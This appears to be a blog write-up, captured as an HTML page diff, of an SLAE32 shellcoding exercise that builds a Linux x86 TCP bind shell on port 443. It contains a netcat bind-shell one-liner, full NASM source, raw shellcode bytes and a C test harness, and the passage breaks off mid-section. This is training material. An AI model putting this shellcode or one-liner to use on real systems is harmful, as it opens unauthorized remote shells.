@@ -1,0 +1,1112 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Exercise Goal This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.
+If you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.
+Why? the goal of that certification is to practice and learn how to solve each exercise by yourself."><meta property="og:title" content="Exercise N°1 - Bindshell (NASM)" />
+<meta property="og:description" content="Exercise Goal This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.
+If you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.
+Why? the goal of that certification is to practice and learn how to solve each exercise by yourself." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.phrozen.io/docs/linux/slae32/ex1-bindshell/" />
+<meta property="article:published_time" content="2020-03-13T11:57:00+01:00" />
+<meta property="article:modified_time" content="2020-03-13T11:57:00+01:00" />
+<title>Exercise N°1 - Bindshell (NASM) | Phrozen</title>
+<link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.63abd10f627a7a06406140610b7ce76d028552de10d790fcb09f332349c39047.css" integrity="sha256-Y6vRD2J6egZAYUBhC3znbQKFUt4Q15D8sJ8zI0nDkEc=">
+<script defer src="/en.search.min.118b26275fec7a27ee379aa176d7c2698670b88b26aa4588f90b91db89d5bbc0.js" integrity="sha256-EYsmJ1/seifuN5qhdtfCaYZwuIsmqkWI&#43;QuR24nVu8A="></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-159560668-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<script src="https://kit.fontawesome.com/8da36c42cc.js" crossorigin="anonymous"></script>
+  
+</head>
+
+<body>
+  <input type="checkbox" class="hidden" id="menu-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      
+  <nav>
+<h2 class="book-brand">
+  <a href="/"><img src="/logo.svg" alt="Logo" /></a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <span>Microsoft Windows</span>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/windows/projects/" class="collapsed ">Projects</a>
+  
+
+          
+  
+  
+  
+
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+    <a href="/docs/windows/snippets/" class="collapsed ">Snippets</a>
+  
+
+          
+  
+  
+  
+
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+    <span>Linux</span>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/linux/slae32/" class="collapsed ">SLAE32</a>
+  
+
+          
+  
+  
+  
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+    <a href="/docs/linux/slae32/ex1-bindshell/" class="active">Exercise N°1 - Bindshell (NASM)</a>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+        </li>
+      
+    
+  </ul>
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="" target="_blank" rel="noopener"><strong>
+        Social Networks
+      </strong></a>
+  </li>
+  
+  <li>
+    <a href="https://www.linkedin.com/in/jlesueur/" target="_blank" rel="noopener"><i class='fa fa-linkedin'></i>
+        Linkedin
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://www.twitter.com/darkcodersc" target="_blank" rel="noopener"><i class='fa fa-twitter'></i>
+        Twitter
+      </a>
+  </li>
+  
+  <li>
+    <a href="" target="_blank" rel="noopener"><strong>
+        Other Stuff
+      </strong></a>
+  </li>
+  
+  <li>
+    <a href="/disclaimer/disclaimer" target="_blank" rel="noopener">
+        Legal
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var menu=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(event){localStorage.setItem("menu.scrollTop",menu.scrollTop);});menu.scrollTop=localStorage.getItem("menu.scrollTop");})();</script>
+
+
+ 
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>Exercise N°1 - Bindshell (NASM)</strong>
+
+  <label for="toc-control">
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+  </label>
+</div>
+
+
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="exercise-goal">Exercise Goal</h1>
+<blockquote class="book-hint warning">
+  <p>This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.</p>
+<p>If you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.</p>
+<p>Why? the goal of that certification is to practice and learn how to solve each exercise by yourself. If you read this paper you will get spoiled and seriously oriented to my personal solution and take the risk to abuse of some shortcuts.</p>
+
+</blockquote>
+
+<ol>
+<li>
+<p>Create a TCP Bindshell Shellcode for Linux x86-32.</p>
+</li>
+<li>
+<p>The port number should be easily configurable.</p>
+</li>
+<li>
+<p>Bonus if getting referenced in <a href="https://www.exploit-db.com">exploit-db</a> or <a href="http://shell-storm.org/">shell-storm</a>.</p>
+</li>
+</ol>
+<h1 id="tcp-bindshell-principle">TCP Bindshell Principle</h1>
+<p>In few words, a TCP Bindshell is a tiny server program that waits for new clients on a specific port.</p>
+<p>When a new client connects to the server it will spawn a new shell (Ex: <code>/bin/bash</code> or <code>/bin/sh</code>) and &ldquo;binds&rdquo; its file descriptors <code>stdin</code>(0) <code>stdout</code>(1) <code>stderr</code>(2) to the new client socket.</p>
+<p>Yes, a socket is nothing more than a file.</p>
+<p>One infamous method to easily create a bindshell is to use <code>Netcat</code> as following:</p>
+<p>root@local:# <code>mknod /tmp/backpipe p &amp;&amp; /bin/sh 0&lt;/tmp/backpipe | nc -lvp 443 1&gt;/tmp/backpipe</code></p>
+<p>When you connect to port <code>443</code> (with any dumb client program ex: <code>Netcat</code>, <code>Telnet</code>) you will get remote control over shell instance.</p>
+<p>user@local:$ <code>nc 127.0.0.1 443</code></p>
+<blockquote class="book-hint warning">
+  On Linux, you must have root privilege or capability to listen on a port. Keep that in mind if you try to execute a Bindshell Shellcode on a program without sufficient privilege.
+</blockquote>
+
+<h2 id="example-result">Example Result</h2>
+<p><img src="/images/202005/Screenshot-2020-05-07-at-10.11.16.png" alt="Bindshell Netcat" /></p>
+<h1 id="process">Process</h1>
+<h2 id="method-1---classic">Method 1 - Classic</h2>
+<h3 id="required-syscalls">Required Syscalls</h3>
+<p>Below table is ordered by syscall execution order.</p>
+<table>
+<thead>
+<tr>
+<th>Decimal N°</th>
+<th>Hex N°</th>
+<th>Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>359</td>
+<td>0x167</td>
+<td>socket()</td>
+</tr>
+<tr>
+<td>54</td>
+<td>0x36</td>
+<td>setsockopt()</td>
+</tr>
+<tr>
+<td>361</td>
+<td>0x169</td>
+<td>bind()</td>
+</tr>
+<tr>
+<td>363</td>
+<td>0x16b</td>
+<td>listen()</td>
+</tr>
+<tr>
+<td>364</td>
+<td>0x16c</td>
+<td>accept4()</td>
+</tr>
+<tr>
+<td>63</td>
+<td>0x3f</td>
+<td>dup2()</td>
+</tr>
+<tr>
+<td>11</td>
+<td>0xb</td>
+<td>execve()</td>
+</tr>
+</tbody>
+</table>
+<p>This technique is what we would use if we were coding a classic server program using higher language (C/C++, Pascal etc..).</p>
+<p>It is more readable and convenient. We won&rsquo;t use that method for creating our bindshell shellcode, so we will just briefly enumerate required steps.</p>
+<h3 id="steps">Steps</h3>
+<ul>
+<li>Create a new IPv4/TCP socket using <code>socket()</code>.</li>
+<li>Call <code>setsockopt()</code> to avoid &ldquo;address already in use&rdquo; error when a port is not completely &ldquo;freed&rdquo;.</li>
+<li>Call <code>bind()</code> to associate a local address to our socket.</li>
+<li>Tell our socket listen for new clients using <code>listen()</code>.</li>
+<li>Hang our program until a new client connects to our server and return a new client socket using <code>accept4()</code>.</li>
+<li>Duplicate <code>stdin</code>(0), <code>stdout</code>(1) and <code>stderr</code>(2) file descriptors with client socket using <code>dup2()</code>.</li>
+<li>Finally, spawn a new shell using <code>execve()</code> with <code>/bin/sh</code> or any shell you want.</li>
+</ul>
+<p>For this exercise we will rather manipulate sockets only using one famous syscall: <code>socketcall()</code>.</p>
+<h2 id="method-2---socketcall">Method 2 - <code>socketcall()</code></h2>
+<h3 id="required-syscalls-1">Required Syscalls</h3>
+<p>Below table is ordered by syscall execution order.</p>
+<table>
+<thead>
+<tr>
+<th>Decimal N°</th>
+<th>Hex N°</th>
+<th>Name</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>102</td>
+<td>0x66</td>
+<td>socketcall()</td>
+</tr>
+<tr>
+<td>63</td>
+<td>0x3f</td>
+<td>dup2()</td>
+</tr>
+<tr>
+<td>11</td>
+<td>0xb</td>
+<td>execve()</td>
+</tr>
+</tbody>
+</table>
+<p>Steps are exactly the same as for classical method (see above) but this time only with three disctinct syscalls to achieve the same result.</p>
+<p>We will replace <code>socket()</code>, <code>setsockopt()</code>, <code>bind()</code>, <code>listen()</code> and <code>accept()</code> only with <code>socketcall()</code> calls.</p>
+<blockquote class="book-hint warning">
+  <p>Quote from : <a href="http://man7.org/linux/man-pages/man2/socketcall.2.html">socketcall man page</a></p>
+<p>« &hellip; On a some architectures—for example, x86-64 and ARM—there is no socketcall() system call; instead socket(2), accept(2), bind(2), and so on really are implemented as separate system calls. &hellip; »</p>
+
+</blockquote>
+
+<h3 id="socketcall-usage-schema"><code>socketcall()</code> usage schema</h3>
+<p>It requires three registers: <code>eax</code>, <code>ebx</code> and <code>ecx</code></p>
+<ul>
+<li>
+<p><code>eax</code> register value needs to be set to <code>0x66</code> representing the syscall number for <code>socketcall()</code></p>
+</li>
+<li>
+<p><code>ebx</code> register must contain the call number (see below table)</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Call Number (Hex)</th>
+<th>Call Name</th>
+<th>Classic Equivalent</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0x1</td>
+<td>SYS_SOCKET</td>
+<td><code>socket()</code></td>
+</tr>
+<tr>
+<td>0xd</td>
+<td>SYS_SETSOCKOPT</td>
+<td><code>setsockopt()</code></td>
+</tr>
+<tr>
+<td>0xc</td>
+<td>SYS_BIND</td>
+<td><code>bind()</code></td>
+</tr>
+<tr>
+<td>0x2</td>
+<td>SYS_LISTEN</td>
+<td><code>listen()</code></td>
+</tr>
+<tr>
+<td>0x3</td>
+<td>SYS_ACCEPT</td>
+<td><code>accept()</code></td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><code>ecx</code> register contain an address pointing a stack location where additional parameters are placed if necessary.</li>
+</ul>
+<h3 id="assembly-code-creation-plan">Assembly Code Creation Plan</h3>
+<h4 id="objectives">Objectives</h4>
+<p>Our objective wont be to create the smallest possible Shellcode.</p>
+<p>Rather we will use more exotic things which requires more lengthy instructions.</p>
+<p>We will only use push instruction one time in our code for preparing memory (nil memory). We will work manually on stack throughout the building of our shellcode.</p>
+<p>Finally last objective is to enjoy building that exercise and prepare ourself to abuse of GDB ☕</p>
+<h4 id="part-i---prepare-memory">Part I - Prepare Memory</h4>
+<p>The very first step of our code is to prepare the memory. We will makes sure that a bunch of lower stack addresses are initialized with zero (arround 30 is far enough) to ensure the stack is clean before doing manual memory manipulations.</p>
+<p>Some benefits include:</p>
+<ul>
+<li>Avoiding NULL characters in our final shellcode.</li>
+<li>Limiting instructions count (when working with parameters set to zero/NULL).</li>
+<li>Be freed of unexcepted behaviors when setting a single byte or word to a specific stack location.</li>
+</ul>
+<h4 id="part-ii---create-our-server">Part II - Create our Server</h4>
+<p>We now safely work on stack addresses, we can continue on building our server. Five steps are required so far.</p>
+<h5 id="step-1--create-socket">Step 1 : Create Socket</h5>
+<p>Syscall <code>socketcall()</code> will be used with <code>ebx</code> set to <code>0x1</code> = <code>SYS_SOCKET</code>.</p>
+<p>Additional parameters needs to be set on stack:</p>
+<table>
+<thead>
+<tr>
+<th>Stack (Low Address)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>AF_INET     = 2 (4B)</td>
+</tr>
+<tr>
+<td>SOCK_STREAM = 1 (4B)</td>
+</tr>
+<tr>
+<td>AUTO = 0 (4B)</td>
+</tr>
+</tbody>
+</table>
+<pre><code>*Debugging* : return value (eax register) must be non negative. The function returns a new socket.
+</code></pre>
+<h5 id="step-2--fix-occasional-address-already-in-use-error">Step 2 : Fix occasional &ldquo;address already in use&rdquo; error</h5>
+<p>Syscall <code>socketcall()</code> will be used with <code>ebx</code> set to <code>0xd</code> = <code>SYS_SETSOCKOPT</code>.</p>
+<p>Additional parameters needs to be set on stack:</p>
+<table>
+<thead>
+<tr>
+<th>Stack (Low Address)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>socket handle (4B)</td>
+</tr>
+<tr>
+<td>SOL_SOCKET = 1 (4B)</td>
+</tr>
+<tr>
+<td>SO_REUSEADDR = 2 (4B)</td>
+</tr>
+<tr>
+<td>addr_of(socketlen_t) (4B)</td>
+</tr>
+<tr>
+<td>len(socketlen_t) = 4 (4B)</td>
+</tr>
+</tbody>
+</table>
+<pre><code>*Debugging* : return value (eax register) must be zero.
+</code></pre>
+<h5 id="step-3--associate-local-address-to-socket">Step 3 : Associate local address to socket</h5>
+<p>Syscall <code>socketcall()</code> will be used with <code>ebx</code> set to <code>0xc</code> = <code>SYS_BIND</code>.</p>
+<p>Additional parameters needs to be set on stack:</p>
+<table>
+<thead>
+<tr>
+<th>Stack (Low Address)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>socket handle (4B)</td>
+</tr>
+<tr>
+<td>addr_of(sockaddr_in) (4B)</td>
+</tr>
+<tr>
+<td>len(sockaddr_in) (4B)</td>
+</tr>
+<tr>
+<td>AF_INET = 2 (2B)</td>
+</tr>
+<tr>
+<td>Port Number = htons(443) (2B)</td>
+</tr>
+<tr>
+<td>0 = INADDR_ANY(0.0.0.0)(4B)</td>
+</tr>
+<tr>
+<td>0 (8B)</td>
+</tr>
+</tbody>
+</table>
+<pre><code>*Debugging* : return value (eax register) must be zero.
+</code></pre>
+<h5 id="step-4--listen-for-incomming-connections">Step 4 : Listen for incomming connections</h5>
+<p>Syscall <code>socketcall()</code> will be used with <code>ebx</code> set to <code>0x2</code> = <code>SYS_LISTEN</code>.</p>
+<p>Additional parameters needs to be set on stack:</p>
+<table>
+<thead>
+<tr>
+<th>Stack (Low Address)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>socket handle (4B)</td>
+</tr>
+<tr>
+<td>backlog = 0 (4B)</td>
+</tr>
+</tbody>
+</table>
+<pre><code>*Debugging* : return value (eax register) must be zero.
+</code></pre>
+<h5 id="step-5--acquire-new-client-socket">Step 5 : Acquire new client socket</h5>
+<p>Syscall <code>socketcall()</code> will be used with <code>ebx</code> set to <code>0x3</code> = <code>SYS_ACCEPT</code>.</p>
+<p>Additional parameters needs to be set on stack:</p>
+<table>
+<thead>
+<tr>
+<th>Stack (Low Address)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>socket handle (4B)</td>
+</tr>
+<tr>
+<td>NULL (sockaddr)</td>
+</tr>
+<tr>
+<td>NULL len(sockaddr)</td>
+</tr>
+</tbody>
+</table>
+<pre><code>*Debugging* : return value (eax register) must be non negative. Function returns a new client socket.
+</code></pre>
+<blockquote class="book-hint info">
+  Since by default we are using sockets in blocking mode, at this moment program will hang until a new client connects to our server (no panic, it is perfectly normal).
+</blockquote>
+
+<h4 id="part-iii---duplicate-file-descriptors">Part III - Duplicate File Descriptors</h4>
+<p>Our server is now willing to acquire new clients, we will now focus on &ldquo;binding&rdquo; acquired client socket with <code>stdin</code>(0), <code>stdout</code>(1) and <code>stderr</code>(2) file descriptors.</p>
+<p>To do so, we will use the function <code>dup2()</code> designated by the syscall <code>0x3f</code></p>
+<ul>
+<li><code>ebx</code> register will contain the client socket handle.</li>
+<li><code>ecx</code> register will contain the file descriptor number.</li>
+</ul>
+<p>To avoid repeating code and increasing the shellcode size, we will loop from 0 to 2 (included).</p>
+<pre><code>for ($ecx = 0; $ecx &lt;= 2; $ecx++){
+    dup2(c_socket, $ecx)
+}
+</code></pre><pre><code>*Debugging* : eax must be greater or equal to zero. 
+On success value is equal to value placed in `ecx` register.
+</code></pre>
+<h4 id="part-iv---execute-a-new-binsh-shell">PART IV - Execute a new <code>/bin/sh</code> shell</h4>
+<p>This part focus on creating a classical <code>execve()</code> call to our desired shell. This syscall number is <code>0xb</code> and as always placed inside <code>eax</code> register.</p>
+<p>For pathname (<code>ebx</code>) we will push the string <code>/bin/sh</code> directly to stack. String slices must be aligned to 4 Bytes. Final string must be NULL terminated.</p>
+<p>For argv (<code>ecx</code>), the best practice is to provide an address pointing to our shell string (<code>/bin/sh</code>)</p>
+<p>Finally argc (<code>edx</code>) will be set to NULL because unused.</p>
+<p>stack representation for <code>ebx</code> parameter</p>
+<table>
+<thead>
+<tr>
+<th>Stack (Low Address)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>NULL (4B)</td>
+</tr>
+<tr>
+<td>&ldquo;hs//&rdquo; (4B)</td>
+</tr>
+<tr>
+<td>&ldquo;nib/&rdquo; (4B)</td>
+</tr>
+</tbody>
+</table>
+<p>stack representation for <code>ecx</code> parameter</p>
+<table>
+<thead>
+<tr>
+<th>Stack (Low Address)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>addr(&quot;/bin/sh&rdquo;)</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<p>Our receipe is now finished we can &ldquo;safely&rdquo; enter in the best part as fun as frustrating.</p>
+<blockquote class="book-hint info">
+  If we were expected to create a regular program, we would take care of closing both server and client socket before gracefully exiting our program. When creating shellcode we are not always excepted to do that unless we want to be sure we would not crash the whole vulnerable application.
+</blockquote>
+
+<h3 id="tcp-bind-assembly-code-nasm">TCP Bind Assembly Code (NASM)</h3>
+<pre><code>;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; Filename : bindshell.nasm                         ;
+; Author   : Jean-Pierre LESUEUR                    ;
+; Website  : https://www.phrozen.io/                ;
+; Email    : jplesueur@phrozen.io                   ;
+; Twitter  : @DarkCoderSc                           ;
+;                                                   ;
+; --------------------------------------------------;
+; SLAE32 Certification Exercise N°1                 ;
+; (Pentester Academy).                              ; 
+; https://www.pentesteracademy.com                  ;
+; --------------------------------------------------;
+;                                                   ;
+; Purpose:                                          ;
+; --------------------------------------------------;
+; Bind Shell                                        ;
+; Bind to 0.0.0.0:443 by default                    ;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+; nasm -f elf32 -o bindshell.o bindshell.nasm
+; ld -o bindshell bindshell.o
+; ./bindshell
+
+global _start			
+
+section .text
+
+_start:
+	mov ebp, esp
+	
+	xor eax, eax
+	xor ebx, ebx
+	xor edx, edx
+	xor esi, esi                   ; will contain our socket handle
+
+	;--------------------------------------------------------------------
+	; fill 30 lower stack addresses with zero
+	; sufficient for our payload
+	;--------------------------------------------------------------------
+	xor ecx, ecx
+	mov cl, 0x1e
+
+_zeromemory:
+	push eax                        ; push 0x00000000 to stack
+ 
+	loop _zeromemory
+
+	mov esp, ebp                    ; stack pointer to initial location	
+
+	;--------------------------------------------------------------------
+	; socket()
+	;--------------------------------------------------------------------
+	mov bl, 0x1                     ; SYS_SOCKET
+		
+	mov byte [esp-0x8], 0x1         ; SOCK_STREAM
+	mov byte [esp-0xc], 0x2         ; AF_INET
+
+	sub esp, 0xc
+	mov ecx, esp
+
+	mov al, 0x66                    ; socketcall() syscall number 
+	int 0x80      
+	
+	mov esi, eax                    ; save new socket handle
+
+	;--------------------------------------------------------------------
+	; setsockopt()
+	;--------------------------------------------------------------------
+	xor eax, eax
+	add bl, 0xd                     ; SYS_SETSOCKOPT
+
+	mov byte [esp-0x4], 0x4         ; length of socklen_t
+	sub esp, 0x4
+
+	mov dword [esp-0x4], esp        ; addr of socklen_t
+	mov byte [esp-0x8], 0x2         ; SO_REUSEADDR
+	mov byte [esp-0xc], 0x1         ; SOL_SOCKET
+	mov dword [esp-0x10], esi       ; socket handle
+
+	sub esp, 0x10
+
+	mov ecx, esp
+
+	mov al, 0x66                    ; socketcall() syscall number 
+	int 0x80
+
+	;--------------------------------------------------------------------
+	; bind()
+	;--------------------------------------------------------------------
+	xor eax, eax
+	sub bl, 0xc                     ; SYS_BIND
+
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+	; struct sockaddr_in /* Size = 16B */ {       ;;
+	;	short    sin_family;		// 2B         ;;
+	;	unsigned short sin_port;	// 2B         ;;
+	;	long     s_addr;            // 4B         ;;
+	;	char     sin_zero[8];		// 8B         ;;
+	; }                                           ;;
+	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+	; prepare sockaddr_in struct
+
+	mov al, 0x01
+	mov ah, 0xbb
+	mov word [esp-0xe], ax          ; port = 443
+	mov byte [esp-0x10], 0x2        ; AF_INET
+
+	xor eax, eax
+	mov al, 0x10
+	sub esp, eax
+	
+	mov byte [esp-0x4], 0x10        ; length sockaddr_in (16 Bytes)
+	mov dword [esp-0x8], esp        ; addr of sockaddr_in
+
+	mov dword [esp-0xc], esi        ; our socket handle
+
+	sub esp, 0xc
+	mov ecx, esp
+	
+	xor eax, eax
+	mov al, 0x66                    ; socketcall() syscall number          
+	int 0x80                  
+
+	;--------------------------------------------------------------------
+	; listen()
+	;--------------------------------------------------------------------
+	add bl, 2                       ; SYS_LISTEN	
+
+	mov dword [esp-0x8], esi        ; out socket handle
+
+	sub esp, 0x8
+	mov ecx, esp
+
+	mov al, 0x66                    ; socketcall() syscall number          
+	int 0x80           
+
+	;--------------------------------------------------------------------
+	; accept()
+	;--------------------------------------------------------------------
+	inc bl                          ; SYS_ACCEPT
+
+	mov [esp-0xc], esi              ; out socket handle
+
+	sub esp, 0xc
+
+	mov ecx, esp
+
+	mov al, 0x66                    ; socketcall() syscall number  
+	int 0x80           
+
+	mov ebx, eax                    ; assign our new client socket to ebx
+
+	;--------------------------------------------------------------------
+	; dup2() : Loop from 0 to 2 
+	;          (stdin, stdout, stderr)
+	;--------------------------------------------------------------------
+	xor ecx, ecx
+_dup2:	
+	xor eax, eax	
+
+	mov al, 0x3f       
+	int 0x80  
+
+	inc cl
+	cmp cl, 0x2
+	jle _dup2     
+
+	;--------------------------------------------------------------------
+	; execve()
+	;--------------------------------------------------------------------
+	xor eax, eax
+	xor ebx, ebx
+	xor ecx, ecx
+
+	; /bin/sh
+	mov dword [esp-0x8], 0x68732f2f
+	mov dword [esp-0xc], 0x6e69622f
+	sub esp, 0xc
+
+	mov ebx, esp
+
+	sub esp, 0x4
+
+	mov edx, esp
+
+	mov dword [esp-0x4], ebx
+	sub esp, 0x4
+
+	mov ecx, esp
+	
+	mov al, 0xb                     ; execve() syscall number
+	int 0x80
+</code></pre><h4 id="compile-and-test-our-payload">Compile and Test our Payload</h4>
+<p>user@local:$ <code>nasm -f elf32 -o bindshell.o bindshell.nasm</code></p>
+<p>user@local:$ <code>ld -o bindshell bindshell.o</code></p>
+<blockquote class="book-hint warning">
+  Remember, we must be root.
+</blockquote>
+
+<p>root@local:$ <code>./bindshell</code></p>
+<p><img src="/images/202005/Screenshot-2020-5-07-at-13.54.31.png" alt="TCP Bindshell (NASM)" /></p>
+<h1 id="final-payload-raw">Final Payload (Raw)</h1>
+<p>We will use a famous command from <a href="https://www.commandlinefu.com/commands/view/6051/get-all-shellcode-on-binary-file-from-objdump">commandlinefu</a> and extract opcodes from our binary.</p>
+<p>user@local:$ <code>objdump -d ./bindshell|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/&quot;/'|sed 's/$/&quot;/g'-v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' '</code></p>
+<pre><code>\x89\xe5\x31\xc0\x31\xdb\x31\xd2\x31\xf6\x31\xc9\xb1\x1e\x50\xe2
+\xfd\x89\xec\xb3\x01\xc6\x44\x24\xf8\x01\xc6\x44\x24\xf4\x02\x83
+\xec\x0c\x89\xe1\xb0\x66\xcd\x80\x89\xc6\x31\xc0\x80\xc3\x0d\xc6
+\x44\x24\xfc\x04\x83\xec\x04\x89\x64\x24\xfc\xc6\x44\x24\xf8\x02
+\xc6\x44\x24\xf4\x01\x89\x74\x24\xf0\x83\xec\x10\x89\xe1\xb0\x66
+\xcd\x80\x31\xc0\x80\xeb\x0c\xb0\x01\xb4\xbb\x66\x89\x44\x24\xf2
+\xc6\x44\x24\xf0\x02\x31\xc0\xb0\x10\x29\xc4\xc6\x44\x24\xfc\x10
+\x89\x64\x24\xf8\x89\x74\x24\xf4\x83\xec\x0c\x89\xe1\x31\xc0\xb0
+\x66\xcd\x80\x80\xc3\x02\x89\x74\x24\xf8\x83\xec\x08\x89\xe1\xb0
+\x66\xcd\x80\xfe\xc3\x89\x74\x24\xf4\x83\xec\x0c\x89\xe1\xb0\x66
+\xcd\x80\x89\xc3\x31\xc9\x31\xc0\xb0\x3f\xcd\x80\xfe\xc1\x80\xf9
+\x02\x7e\xf3\x31\xc0\x31\xdb\x31\xc9\xc7\x44\x24\xf8\x2f\x2f\x73
+\x68\xc7\x44\x24\xf4\x2f\x62\x69\x6e\x83\xec\x0c\x89\xe3\x83\xec
+\x04\x89\xe2\x89\x5c\x24\xfc\x83\xec\x04\x89\xe1\xb0\x0b\xcd\x80
+</code></pre><p>To ensure our shellcode is working when embeeded inside a willingly vulnerable program, we will paste it inside our SLAE32 shellcode.c template file.</p>
+<pre><code>#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+
+unsigned char code[] = \
+    &quot;\x89\xe5\x31\xc0\x31\xdb\x31\xd2\x31\xf6\x31\xc9\xb1\x1e\x50\xe2&quot;
+    &quot;\xfd\x89\xec\xb3\x01\xc6\x44\x24\xf8\x01\xc6\x44\x24\xf4\x02\x83&quot;
+    &quot;\xec\x0c\x89\xe1\xb0\x66\xcd\x80\x89\xc6\x31\xc0\x80\xc3\x0d\xc6&quot;
+    &quot;\x44\x24\xfc\x04\x83\xec\x04\x89\x64\x24\xfc\xc6\x44\x24\xf8\x02&quot;
+    &quot;\xc6\x44\x24\xf4\x01\x89\x74\x24\xf0\x83\xec\x10\x89\xe1\xb0\x66&quot;
+    &quot;\xcd\x80\x31\xc0\x80\xeb\x0c\xb0\x01\xb4\xbb\x66\x89\x44\x24\xf2&quot;
+    &quot;\xc6\x44\x24\xf0\x02\x31\xc0\xb0\x10\x29\xc4\xc6\x44\x24\xfc\x10&quot;
+    &quot;\x89\x64\x24\xf8\x89\x74\x24\xf4\x83\xec\x0c\x89\xe1\x31\xc0\xb0&quot;
+    &quot;\x66\xcd\x80\x80\xc3\x02\x89\x74\x24\xf8\x83\xec\x08\x89\xe1\xb0&quot;
+    &quot;\x66\xcd\x80\xfe\xc3\x89\x74\x24\xf4\x83\xec\x0c\x89\xe1\xb0\x66&quot;
+    &quot;\xcd\x80\x89\xc3\x31\xc9\x31\xc0\xb0\x3f\xcd\x80\xfe\xc1\x80\xf9&quot;
+    &quot;\x02\x7e\xf3\x31\xc0\x31\xdb\x31\xc9\xc7\x44\x24\xf8\x2f\x2f\x73&quot;
+    &quot;\x68\xc7\x44\x24\xf4\x2f\x62\x69\x6e\x83\xec\x0c\x89\xe3\x83\xec&quot;
+    &quot;\x04\x89\xe2\x89\x5c\x24\xfc\x83\xec\x04\x89\xe1\xb0\x0b\xcd\x80&quot;;
+
+
+main()
+{
+	printf(&quot;Shellcode Length:  %d\n&quot;, strlen(code));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+}
+</code></pre><p>user@local:$ <code>gcc shellcode.c -o shellcode -z execstack</code></p>
+<p>root@local:$ <code>./shellcode</code></p>
+<blockquote class="book-hint warning">
+  Remember(2), we must be root.
+</blockquote>
+
+<h1 id="shellcode-builder-python3">Shellcode Builder (Python3)</h1>
+<p>Last and not mandatory exercise goal is to propose a way easy replace default TCP port number (in our case 443) with any ports from <code>0</code> to <code>65535</code>.</p>
+<p>This part is quite hard to explain so I wont promise it will be the clearer possible. Forgive me in advance.</p>
+<p>We need abolutely need to take care of two important things:</p>
+<div class="book-columns flex flex-wrap">
+  
+  <div class="flex-even markdown-inner">
+    <h2 id="n1">N°1</h2>
+<p>Port number needs to be converted in Big-Endian as required by documentation related to networking programming then hex encoded.</p>
+<p>Output port needs to be inserted in reverse order inside our payload.</p>
+
+  </div>
+  
